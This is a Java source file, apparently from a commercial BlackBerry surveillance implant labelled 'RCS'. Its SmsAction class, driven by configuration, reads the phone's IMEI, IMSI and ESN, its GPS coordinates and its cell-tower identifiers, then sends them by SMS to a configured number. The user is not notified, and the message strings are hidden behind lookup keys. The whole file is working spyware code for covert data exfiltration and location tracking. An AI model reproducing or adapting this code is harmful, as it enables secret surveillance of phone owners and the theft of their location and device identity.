//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import javax.microedition.location.Location;
import javax.microedition.location.QualifiedCoordinates;

import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Device;
import blackberry.Messages;
import blackberry.SMSHelper;
import blackberry.Status;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;
import blackberry.utils.StringUtils;
import blackberry.utils.Utils;

/**
 * The Class SmsAction.
 */
public final class SmsAction extends SubAction implements LocationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("SmsAction", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final int TYPE_LOCATION = 1;
    private static final int TYPE_SIM = 2;
    private static final int TYPE_TEXT = 3;

    String number;
    String text;
    int type=TYPE_TEXT;

    public SmsAction(final ConfAction params) {
        super(params);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final ConfAction params) {
        try {
            number = Utils
                    .unspace(params.getString(Messages.getString("9.26"))); //$NON-NLS-1$      
            // default TEXT
            descrType = params.getString(Messages.getString("9.27"),Messages.getString("9.29")); //$NON-NLS-1$
            if (Messages.getString("9.28").equals(descrType)) { //$NON-NLS-1$
                type = TYPE_LOCATION;
            } else if (Messages.getString("9.29").equals(descrType) ) { //$NON-NLS-1$
                type = TYPE_TEXT;
            } else if (Messages.getString("9.30").equals(descrType)) { //$NON-NLS-1$
                type = TYPE_SIM;
            } else {
                //#ifdef DEBUG
                debug.error("parse Error, unknown type: " + descrType); //$NON-NLS-1$
                //#endif
                return false;
            }
    
            //#ifdef DBC
            Check.asserts(type >= 1 && type <= 3, "wrong type"); //$NON-NLS-1$
            //#endif
    
            switch (type) {
                case TYPE_TEXT:
                    text = params.getString(Messages.getString("9.33"),"No Text"); //$NON-NLS-1$
                    break;
                case TYPE_LOCATION:
                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                    break;
                case TYPE_SIM:
                    final StringBuffer sb = new StringBuffer();
                    final Device device = Device.getInstance();
                    if (Device.isCDMA()) {
    
                        sb.append(Messages.getString("9.34") + device.getSid() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
                        sb.append(Messages.getString("9.36") //$NON-NLS-1$
                                + NumberUtilities.toString(device.getEsn(), 16)
                                + "\n"); //$NON-NLS-1$
                    }
                    if (Device.isGPRS()) {
                        sb.append(Messages.getString("9.38") + device.getImei(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
                        sb.append(Messages.getString("9.40") + device.getImsi(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
                    }
                    if (Device.isIDEN()) {
                        //#ifdef DEBUG
                        debug.error("SmsAction: IDEN not supported"); //$NON-NLS-1$
                        //#endif
                    }
    
                    text = sb.toString();
                    break;
                default:
                    //#ifdef DEBUG
                    debug.error("SmsAction.parse,  Unknown type: " + type); //$NON-NLS-1$
                    //#endif
                    break;
            }
    
        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error(Messages.getString("9.44")); //$NON-NLS-1$
            //#endif
            return false;
        }
    
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Trigger triggeringEvent) {

        try {
            switch (type) {
                case TYPE_TEXT:
                case TYPE_SIM:
                    return sendSMS(text);

                case TYPE_LOCATION:
                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                                        
                    if (!getGPSPosition()) {
                        errorLocation(false);
                    }

                    break;
                default:
                    //#ifdef DEBUG
                    debug.error("execute: Not supported type: " + type); //$NON-NLS-1$
                    //#endif
            }
            return true;
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
            return false;
        }
    }

    private boolean getCellPosition() {

        //#ifdef DEBUG
        debug.trace("getCellPosition"); //$NON-NLS-1$
        //#endif
        String message;

        try {
            if (Device.isGPRS()) {
                // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
                // CC e MNC possono essere estratti da IMEI
                // http://en.wikipedia.org/wiki/Mobile_country_code
                // http://en.wikipedia.org/wiki/Mobile_Network_Code
                final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

                int mcc = Utils.hex(RadioInfo.getMCC(RadioInfo
                        .getCurrentNetworkIndex()));
                int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
                
                final int lac = cellinfo.getLAC();
                final int cid = cellinfo.getCellId();
                final int bsic = cellinfo.getBSIC();

                final StringBuffer mb = new StringBuffer();
                mb.append(Messages.getString("9.3") + mcc); //$NON-NLS-1$
                mb.append(Messages.getString("9.4") + mnc); //$NON-NLS-1$
                mb.append(Messages.getString("9.5") + lac); //$NON-NLS-1$
                mb.append(Messages.getString("9.6") + cid); //$NON-NLS-1$
                message = mb.toString();
            } else if (Device.isCDMA()) {
                final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
                //CDMAInfo.getIMSI()
                final int sid = cellinfo.getSID();
                final int nid = cellinfo.getNID();
                final int bid = cellinfo.getBID();

                final StringBuffer mb = new StringBuffer();
                mb.append(Messages.getString("9.7") + sid); //$NON-NLS-1$
                mb.append(Messages.getString("9.8") + nid); //$NON-NLS-1$
                mb.append(Messages.getString("9.9") + bid); //$NON-NLS-1$
                message = mb.toString();
            } else if (Device.isIDEN()) {
                //#ifdef DEBUG
                debug.error("getCellPosition: IDEN not supported"); //$NON-NLS-1$
                //#endif
                return false;
            } else {
                //#ifdef DEBUG
                debug.trace("getCellPosition: not supported"); //$NON-NLS-1$
                //#endif
                return false;
            }
            //#ifdef DEBUG
            debug.info(message);
            //#endif

            return sendSMS(message);
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
            return false;
        }
    }

    private boolean getGPSPosition() {

        if (waitingForPoint) {
            //#ifdef DEBUG
            debug.trace("waitingForPoint"); //$NON-NLS-1$
            //#endif
            return false;
        }

        if (Status.self().crisisPosition()) {
            //#ifdef DEBUG
            debug.trace("locationGPS: crisis"); //$NON-NLS-1$
            //#endif
            return false;
        }

        if (!Device.getInstance().hasGPS()) {
            //#ifdef DEBUG
            debug.error("locationGPS: doesn't have GPS"); //$NON-NLS-1$
            //#endif
            return false;
        }
        
        synchronized (this) {
            LocationHelper.getInstance().start(this, true);
        }

        return true;
    }

    public void newLocation(Location loc) {
        try{
            //#ifdef DEBUG
            debug.trace("newLocation"); //$NON-NLS-1$
            //#endif
    
            if (loc == null) {
                //#ifdef DEBUG
                debug.error("Error in getLocation"); //$NON-NLS-1$
                //#endif  
                return;
            }
    
            final float speed = loc.getSpeed();
            final float course = loc.getCourse();
    
            final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
            if (qc == null) {
                //#ifdef DEBUG
                debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
                //#endif                        
                errorLocation(false);
            }else{
                final StringBuffer sb = new StringBuffer();
                sb.append(Messages.getString("9.16") + qc.getLatitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
                sb.append(Messages.getString("9.18") + qc.getLongitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        
                sendSMS(sb.toString());
            }
        }catch(Exception ex){
            //#ifdef DEBUG
            debug.error("newLocation: " + ex);
            //#endif
        }

    }

    public void errorLocation(boolean interrupted) {
        //#ifdef DEBUG
        debug.error("Cannot get Location"); //$NON-NLS-1$
        //#endif  

        if (!getCellPosition()) {
            sendSMS(Messages.getString("9.0")); //$NON-NLS-1$
        }
    }

    boolean waitingForPoint;

    private String descrType;

    public void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

    boolean sendSMS(final String message) {
        
        if(StringUtils.empty(number) || StringUtils.empty(message)){
            //#ifdef DEBUG
            debug.trace("sendSMS: empty number or message");
            //#endif
            return false;
        }
        
        boolean ret = false;
        if (Device.isCDMA()) {
            //#ifdef DEBUG
            debug.trace("sendSMS: Datagram"); //$NON-NLS-1$
            //#endif
            ret = SMSHelper.sendSMSDatagram(number, message);
        } else if (Device.isGPRS()) {
            //#ifdef DEBUG
            //debug.trace("sendSMS: Binary");
            //#endif
            //ret = sendSMSBinary(message);

            //#ifdef DEBUG
            debug.trace("sendSMS: Text"); //$NON-NLS-1$
            //#endif
            if (Device.isSimEnabled()) {
                ret = SMSHelper.sendSMSText(number, message);
            } else {
                //#ifdef DEBUG
                debug.error("sendSMS: sim not enabled"); //$NON-NLS-1$
                //#endif
            }
        } else if (Device.isIDEN()) {
            //#ifdef DEBUG
            debug.error("sendSMS: Iden not supported"); //$NON-NLS-1$
            //#endif
        } else {

        }
        
        //#ifdef DEBUG
        debug.trace("sendSMS end");
        //#endif
        return ret;
    }

    //#ifdef DEBUG
    public String toString() {
        final StringBuffer sb = new StringBuffer();
        sb.append(Messages.getString("9.1") + type); //$NON-NLS-1$
        sb.append(Messages.getString("9.46") + number); //$NON-NLS-1$
        sb.append(Messages.getString("9.47") + text); //$NON-NLS-1$

        return sb.toString();
    }
    //#endif

}
